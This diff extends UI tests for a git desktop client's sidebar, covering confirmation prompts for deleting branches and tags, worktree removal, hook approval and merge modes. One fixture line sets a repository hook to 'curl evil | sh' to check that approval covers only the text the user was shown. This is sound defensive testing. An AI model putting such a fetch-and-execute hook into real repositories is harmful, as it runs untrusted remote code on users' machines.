@@ -14,9 +14,16 @@ import BranchList from "../src/lib/components/BranchList.svelte";
 import WorktreesPanel from "../src/lib/components/WorktreesPanel.svelte";
 import { sidebarRowHeight } from "../src/lib/sidebar/metrics";
 import ToastContainer from "../src/lib/components/ToastContainer.svelte";
+import { promptState, completePrompt } from "../src/lib/stores/modalStore";
 const params = new URLSearchParams(location.search);
 themeStore.setTheme(params.get("theme") === "light" ? "light" : "dark");
 const results = [], crashes = [], merges = [], copies = [], unexpected = [], transfers = [];
+const branchDeletes = [], tagDeletes = [], branchCreates = [], wtRemovals = [], wtCreates = [], hookApprovals = [];
+// The repository's hooks file as the host would read it; `approved` follows the last approval.
+let hooksFile = {file:".gitpulse/hooks",content:"post_create: make setup",approved:false};
+// The long worktree's change count; null is "not scanned", which is not clean.
+let wtDirty = 12;
+let tags = [], tagsTruncated = false, failTags = false, deleteRefusal = "", failCreate = false;
 let current = "main", failMerge = false, pendingMerge = null, operation = null, probeFailed = false, copyFailed = false;
 // Churn and divergence are derived from the name so they are stable across
 // runs but non-zero: every branch used to arrive as all-zeros, so the row's
@@ -51,7 +58,11 @@ const fixture = {
   cmd_resolve_repo: a => ({path:a.path,name:"GitPulse",is_bare:false}),
   cmd_list_branches: () => branches.map(b => ({...b,is_current:!b.is_remote&&b.name===current})),
   cmd_get_status: () => operation ? [{path:"conflict.txt",status_code:"UU",is_staged:false,is_conflicted:true,additions:0,deletions:0}] : [],
-  cmd_last_fetch_at: () => null, cmd_note_tab_activated: () => null, cmd_list_tags: () => ({tags:[],truncated:false}), cmd_stash_list: () => ({ entries: [], truncated: false }),
+  cmd_last_fetch_at: () => null, cmd_note_tab_activated: () => null, cmd_list_tags: () => {if(failTags)throw Error("Fixture tag read failed");return {tags,truncated:tagsTruncated};},
+  // A non-forced delete of an unmerged branch is refused with git's own words.
+  cmd_delete_branch: a => {branchDeletes.push({branch:a.branchName,force:a.force});if(!a.force&&deleteRefusal)throw Error(deleteRefusal);return "";},
+  cmd_delete_tag: a => {tagDeletes.push(a.tagName);return "";},
+  cmd_create_branch: a => {branchCreates.push(a.branchName);if(failCreate)throw Error("Fixture branch create failed");return "";}, cmd_stash_list: () => ({ entries: [], truncated: false }),
   cmd_watch_repo: () => null, cmd_unwatch_repo: () => null, cmd_list_repo_files: () => [],
   cmd_get_commit_graph: () => ({nodes:[],edges:[],total_commits:0,truncated:false}),
   cmd_set_recent_menu: () => null, cmd_workspace_sync: () => ({repos:[]}),
@@ -64,7 +75,11 @@ const fixture = {
   // of short names cannot show the layout the worktree row broke.
   cmd_list_worktrees: () => [
     {path:REPO,name:"GitPulse",branch:"main",head:"f".repeat(40),is_main:true,is_bare:false,is_detached:false,is_locked:false,is_prunable:false,dirty_files:1},
-    {path:`${REPO}/.claude/worktrees/${LONG_WORKTREE}`,name:LONG_WORKTREE,branch:`claude/${LONG_WORKTREE}`,head:"b".repeat(40),is_main:false,is_bare:false,is_detached:false,is_locked:false,is_prunable:false,dirty_files:12}],
+    {path:`${REPO}/.claude/worktrees/${LONG_WORKTREE}`,name:LONG_WORKTREE,branch:`claude/${LONG_WORKTREE}`,head:"b".repeat(40),is_main:false,is_bare:false,is_detached:false,is_locked:false,is_prunable:false,dirty_files:wtDirty}],
+  cmd_add_worktree: a => {wtCreates.push(a);return {output:{path:a.targetPath,cache_error:null,hook_error:null,hook_notice:null}};},
+  cmd_preview_worktree_hooks: () => ({...hooksFile}),
+  cmd_approve_worktree_hooks: a => {hookApprovals.push(a.content);if(a.content===hooksFile.content)hooksFile={...hooksFile,approved:true};return null;},
+  cmd_remove_worktree: a => {wtRemovals.push({targetPath:a.targetPath,force:a.force});return null;},
   cmd_repository_trust: () => ({path:REPO,git_dir:`${REPO}/.git`,common_dir:`${REPO}/.git`,identity:"fixture",scope:"repository",worktrees:2}),
   cmd_task_view: () => ({available:false,store_path:"",leases:[],error:""}),
   cmd_worktree_task: () => null,
@@ -219,6 +234,53 @@ if(params.has("check")) {
     check("the armed confirm names the cost, inside the row",
       !!longRow && longRow.textContent.includes("Discard 12 changed files?")
       && longRow.scrollWidth <= Math.ceil(longRow.getBoundingClientRect().width) + 1);
+    // Arming wrote nothing; the second click on the same button removes, and
+    // force is passed only for a scanned dirty tree whose cost was named.
+    check("arming the remove confirm removes nothing",wtRemovals.length===0);
+    const armed=()=>[...wtHost.querySelectorAll("button")].find(b=>(b.getAttribute("aria-label")??"").startsWith("Discard 12 changed files?")||(b.getAttribute("aria-label")??"").startsWith("Not scanned for changes"));
+    wtDirty=null;
+    armed()?.click();await waitFor(()=>wtRemovals.length===1);
+    check("the second click force-removes a scanned dirty worktree after naming its cost",
+      wtRemovals[0].force===true&&wtRemovals[0].targetPath===`${REPO}/.claude/worktrees/${LONG_WORKTREE}`);
+    // The removal reloads the list, now unscanned (null): never forced.
+    await waitFor(()=>[...wtHost.querySelectorAll("button")].some(b=>b.getAttribute("aria-label")==="Remove this worktree"));
+    [...wtHost.querySelectorAll("button")].find(b=>b.getAttribute("aria-label")==="Remove this worktree").click();await settle();
+    check("an unscanned worktree's armed confirm says it was not scanned",armed()?.getAttribute("aria-label")==="Not scanned for changes — click again to try a clean remove");
+    armed()?.click();await waitFor(()=>wtRemovals.length===2);
+    check("an unscanned worktree is never force-removed",wtRemovals[1].force===false);
+    wtDirty=12;
+    // Repository hooks run shell commands from a file the working tree
+    // controls: off by default (build-cache sharing on), and approved only as
+    // the exact text that was shown.
+    const wtButton=label=>[...wtHost.querySelectorAll("button")].find(b=>b.getAttribute("aria-label")===label||b.textContent.trim()===label);
+    const formBox=label=>[...wtHost.querySelectorAll("form label")].find(l=>l.textContent.includes(label))?.querySelector('input[type="checkbox"]');
+    const consent=()=>wtHost.querySelector('[data-testid="worktree-hooks-consent"]');
+    const submitWorktree=async path=>{const field=wtHost.querySelector('form input[placeholder="/absolute/path for the worktree"]');field.value=path;field.dispatchEvent(new Event("input",{bubbles:true}));await settle();field.form.requestSubmit();await waitFor(()=>wtCreates.length&&wtCreates.at(-1).targetPath===path);};
+    wtButton("Create worktree").click();await settle();
+    check("a new worktree starts with hooks off and build-cache sharing on, and no consent box",
+      formBox("Run repository hooks")?.checked===false&&formBox("Share build caches")?.checked===true&&!consent());
+    await submitWorktree("/fixture/wt-plain");
+    check("creating with the defaults sends hooks off and caches on",wtCreates.at(-1).runHooks===false&&wtCreates.at(-1).cowCaches===true);
+    await waitFor(()=>wtButton("Create worktree"));wtButton("Create worktree").click();await settle();
+    formBox("Run repository hooks").click();await waitFor(()=>consent()?.textContent.includes("post_create: make setup"));
+    check("asking for hooks shows the file's exact text and says nothing runs until it is approved",
+      consent().textContent.includes(".gitpulse/hooks runs these as shell commands")
+      &&consent().textContent.includes("Not approved: nothing runs until you approve exactly this text."));
+    // The file changes on disk after it was shown: the approval must carry
+    // the text the person read, never the newer one.
+    const shownText=hooksFile.content;
+    hooksFile={...hooksFile,content:"post_create: curl evil | sh"};
+    [...consent().querySelectorAll("button")].find(b=>b.textContent.trim()==="Approve these hooks").click();
+    await waitFor(()=>hookApprovals.length===1);await settle();await settle();
+    check("approving sends exactly the text that was shown, not the file as it is now",
+      hookApprovals[0]===shownText&&hooksFile.approved===false
+      &&consent()?.textContent.includes("post_create: curl evil | sh")&&consent()?.textContent.includes("Not approved"));
+    [...consent().querySelectorAll("button")].find(b=>b.textContent.trim()==="Approve these hooks").click();
+    await waitFor(()=>consent()?.textContent.includes("Approved. Editing the file asks again."));
+    check("approving the text on screen marks it approved",hookApprovals.at(-1)==="post_create: curl evil | sh");
+    await submitWorktree("/fixture/wt-hooks");
+    check("creating with hooks asked for sends that choice",wtCreates.at(-1).runHooks===true);
+    hooksFile={file:".gitpulse/hooks",content:"post_create: make setup",approved:false};
     await unmount(wtPanel);wtHost.remove();
 
     check("visible merge entry point",button("Merge branches"));
@@ -237,7 +299,7 @@ if(params.has("check")) {
     sourceRow.dispatchEvent(new MouseEvent("contextmenu",{bubbles:true,cancelable:true,clientX:150,clientY:260}));await settle();
     await click("Fast-forward merge…");
     check("context menu opens review without merging",merges.length===0&&dialog());
-    check("context menu preserves source and merge mode",button("Select local branch feature/branch-selection").getAttribute("aria-checked")==="true"&&dialog().querySelector('input[type="checkbox"]').checked);
+    check("context menu preserves source and merge mode",button("Select local branch feature/branch-selection").getAttribute("aria-checked")==="true"&&dialog().querySelector('input[name="merge-mode"]:checked')?.value==="ff-only");
     await click("Cancel");
     // A menu action closes the menu first, and the branch it acts on is a
     // `{@const}` derived from that menu. Read after the close, it re-derives
@@ -251,6 +313,91 @@ if(params.has("check")) {
     check(`menu Push and Pull act on the branch the menu was opened for (${crashes.slice(crashesBeforeTransfer).join(" | ")})`,
       crashes.length===crashesBeforeTransfer&&transfers.length===2
       &&transfers.every(t=>t.branch==="feature/branch-selection")&&transfers[0].kind==="push"&&transfers[1].kind==="pull");
+    // --- delete, tags and create: the prompts that guard a write ----------
+    const prompt = () => get(promptState)?.options;
+    const answer = async value => {completePrompt(value);await settle();await settle();};
+    const rowFor = name => [...document.querySelectorAll("button")].find(b=>b.title.startsWith(`${name}\n`));
+    const menuFor = async (row) => {row.dispatchEvent(new MouseEvent("contextmenu",{bubbles:true,cancelable:true,clientX:150,clientY:260}));await settle();};
+    const target = "feature/keyboard-navigation";
+    await menuFor(rowFor(target));await click("Delete…");
+    check("deleting a branch asks first and writes nothing until answered",prompt()?.title==="Delete branch"&&prompt()?.message===`Delete branch ${target}?`&&branchDeletes.length===0);
+    await answer(false);
+    check("declining the delete prompt deletes nothing",branchDeletes.length===0&&!prompt());
+    deleteRefusal=`error: the branch '${target}' is not fully merged.`;
+    await menuFor(rowFor(target));await click("Delete…");await answer(true);await waitFor(()=>prompt());
+    const forceTarget=branches.find(b=>b.name===target);
+    check("a confirmed delete tries the safe delete first",branchDeletes.length===1&&branchDeletes[0].force===false);
+    check("git's unmerged refusal escalates to a separate force prompt naming what would be lost",
+      prompt()?.title==="Force-delete branch"&&prompt()?.confirmLabel==="Force delete"
+      &&prompt()?.message.includes(`${target} has ${forceTarget.commits_ahead_of_base} commit`)&&prompt()?.message.includes("discards them permanently"));
+    await answer(false);
+    check("declining the force prompt never forces",branchDeletes.length===1&&branchDeletes.every(d=>!d.force));
+    repoStore.setError(null);
+    await menuFor(rowFor(target));await click("Delete…");await answer(true);await waitFor(()=>prompt()?.title==="Force-delete branch");await answer(true);
+    await waitFor(()=>branchDeletes.length===3);
+    check("only an explicit second confirm forces the delete",branchDeletes[1].force===false&&branchDeletes[2].force===true&&branchDeletes[2].branch===target);
+    deleteRefusal="";repoStore.setError(null);
+    // A different refusal (a worktree holds it) offers no force at all.
+    deleteRefusal=`error: cannot delete branch '${target}' used by worktree at '/elsewhere'`;
+    await menuFor(rowFor(target));await click("Delete…");await answer(true);await settle();await settle();
+    check("a refusal force cannot fix offers no force prompt",branchDeletes.length===4&&branchDeletes[3].force===false&&!prompt());
+    deleteRefusal="";repoStore.setError(null);
+    // Tags: chip only when compared and ahead; failed and capped reads say so.
+    tags=[{name:"v1.0",commit_id:"a".repeat(40),commits_ahead_of_base:3,commits_behind_base:0,compared_to:"main"},
+      {name:"v0.9",commit_id:"b".repeat(40),commits_ahead_of_base:5,commits_behind_base:0,compared_to:null},
+      {name:"v0.8",commit_id:"c".repeat(40),commits_ahead_of_base:0,commits_behind_base:2,compared_to:"main"}];
+    await repoStore.refresh();await settle();
+    const tagsHeader=()=>[...document.querySelectorAll("button[aria-expanded]")].find(b=>/^Tags\s*\(/.test(b.textContent.trim()));
+    if(tagsHeader()?.getAttribute("aria-expanded")==="false"){tagsHeader().click();await settle();}
+    const tagRowFor=name=>[...document.querySelectorAll(".gp-cv-row")].find(r=>r.textContent.trim().startsWith(name));
+    check("a compared tag holding work off the base shows how far ahead it is",tagRowFor("v1.0")?.querySelector('span[title="3 commits not in main"]')?.textContent.trim()==="+3");
+    check("an uncompared or already-merged tag shows no ahead chip",tagRowFor("v0.9")&&!tagRowFor("v0.9").querySelector('span[title*="commits not in"]')&&tagRowFor("v0.8")&&!tagRowFor("v0.8").querySelector('span[title*="commits not in"]'));
+    await menuFor(tagRowFor("v1.0"));await click("Delete…");
+    check("deleting a tag asks first and writes nothing until answered",prompt()?.title==="Delete tag"&&tagDeletes.length===0);
+    await answer(false);
+    check("declining the tag prompt deletes nothing",tagDeletes.length===0);
+    await menuFor(tagRowFor("v1.0"));await click("Delete…");await answer(true);await waitFor(()=>tagDeletes.length===1);
+    check("a confirmed tag delete deletes exactly that tag",tagDeletes.join()==="v1.0");
+    tagsTruncated=true;await repoStore.refresh();await settle();
+    check("a capped tag list says older tags are not listed",document.getElementById("sidebar").textContent.includes("Older tags exist and are not listed."));
+    tagsTruncated=false;failTags=true;await repoStore.refresh();await settle();
+    check("an unreadable tag list says so instead of looking complete",document.getElementById("sidebar").textContent.includes("The tag list could not be read, so this may not be complete."));
+    failTags=false;tags=[];await repoStore.refresh();await settle();repoStore.setError(null);
+    // The counters on line two say what they count, and a base comparison
+    // also reports how far behind the base the branch is — no chip shows that.
+    {
+      // One branch compared against a named base and behind it, so both
+      // halves of the base title are exercised.
+      const saved=branches;
+      branches=branches.map(b=>b.name==="feature/branch-selection"&&!b.is_remote?{...b,tip_commit_id:"def456789012",compared_to:"main",commits_ahead_of_base:4,commits_behind_base:9}:b);
+      await repoStore.refresh();await settle();
+      const pick=branches.filter(b=>!b.is_remote&&b.name!=="main");
+      const why=[];
+      const numbersOk=pick.every(b=>{
+        const row=rowFor(b.name)?.closest(".gp-cv-row")??rowFor(b.name);
+        if(!row)return false;
+        const titles=[...row.querySelectorAll("span[title]")].map(el=>el.getAttribute("title"));
+        const up=b.ahead_count>0?titles.includes(`${b.ahead_count} ahead of upstream`):!titles.some(t=>t.endsWith("ahead of upstream"));
+        const down=b.behind_count>0?titles.includes(`${b.behind_count} behind upstream`):!titles.some(t=>t.endsWith("behind upstream"));
+        const baseTitle=`${b.commits_ahead_of_base} commits ahead of ${b.compared_to||"base"}${b.commits_behind_base>0?`, ${b.commits_behind_base} behind`:""}`;
+        const base=b.commits_ahead_of_base>0?titles.includes(baseTitle):!titles.some(t=>t.includes("commits ahead of"));
+        if(!(up&&down&&base))why.push(`${b.name}: ${titles.join(" | ")}`);
+        return up&&down&&base;
+      });
+      check(`upstream arrows and the base counter say what they count, including commits behind the base${why.length?` (${why.join("; ")})`:""}`,
+        pick.length>=3&&numbersOk&&pick.some(b=>b.compared_to==="main"&&b.commits_behind_base>0&&b.commits_ahead_of_base>0));
+      branches=saved;await repoStore.refresh();await settle();
+    }
+    // A failed create keeps the form open with the typed name.
+    await click("Create branch");
+    const nameField=()=>document.querySelector('#sidebar input[placeholder="feat/name"]');
+    failCreate=true;nameField().value="feat/kept";nameField().dispatchEvent(new Event("input",{bubbles:true}));await settle();
+    nameField().form.requestSubmit();await waitFor(()=>branchCreates.length===1);await settle();
+    check("a failed branch create keeps the form open with the typed name",nameField()?.value==="feat/kept");
+    failCreate=false;repoStore.setError(null);
+    nameField().form.requestSubmit();await waitFor(()=>branchCreates.length===2);await settle();
+    check("a successful branch create clears and closes the form",branchCreates.join()==="feat/kept,feat/kept"&&!nameField());
+    repoStore.setError(null);
     await click("Merge branches");
     check("picker opens without mutating",dialog()&&merges.length===0);
     check("search receives initial focus",document.activeElement?.id==="merge-branch-search");
@@ -269,7 +416,7 @@ if(params.has("check")) {
     document.activeElement.dispatchEvent(new KeyboardEvent("keydown",{key:"ArrowDown",bubbles:true,cancelable:true}));await settle();
     check("arrow navigation selects exactly one source",button("Select local branch feature/keyboard-navigation").getAttribute("aria-checked")==="true"&&document.querySelectorAll('[role="radio"][aria-checked="true"]').length===1);
     document.activeElement.dispatchEvent(new KeyboardEvent("keydown",{key:"Tab",bubbles:true,cancelable:true}));await settle();
-    check("Tab leaves the entire branch list for merge options",document.activeElement===dialog().querySelector('input[type="checkbox"]'));
+    check("Tab leaves the entire branch list for merge options",document.activeElement?.getAttribute("name")==="merge-mode");
     document.querySelector("#merge-branch-search").focus();document.activeElement.dispatchEvent(new KeyboardEvent("keydown",{key:"ArrowDown",bubbles:true,cancelable:true}));await settle();
     check("search reenters the selected radio",document.activeElement===button("Select local branch feature/keyboard-navigation"));
     await click("Remote branches");
@@ -286,10 +433,10 @@ if(params.has("check")) {
     check("arrow key enters branch choices",document.activeElement?.hasAttribute("data-merge-choice"));
     await click("Select remote branch origin/feature/branch-selection");
     check("selection is explicit and enables merge",button("Select remote branch origin/feature/branch-selection").getAttribute("aria-checked")==="true"&&!button("Merge branch").disabled);
-    const checkbox=dialog().querySelector('input[type="checkbox"]');checkbox.click();await settle();
+    dialog().querySelector('input[name="merge-mode"][value="ff-only"]').click();await settle();
     await click("Merge branch");await waitFor(()=>!dialog());
     check("remote identity survives the merge IPC",merges.at(-1).branchName==="refs/remotes/origin/feature/branch-selection");
-    check("fast-forward setting is preserved",merges.at(-1).ffOnly===true);
+    check("fast-forward setting is preserved",merges.at(-1).mode==="ff-only");
     check("success identifies source and destination",get(toastStore).some(t=>t.message==="Merged origin/feature/branch-selection into main"));
     await click("Merge branches");await search("no-match");
     check("empty search has recovery copy",dialog().textContent.includes("No branches match"));
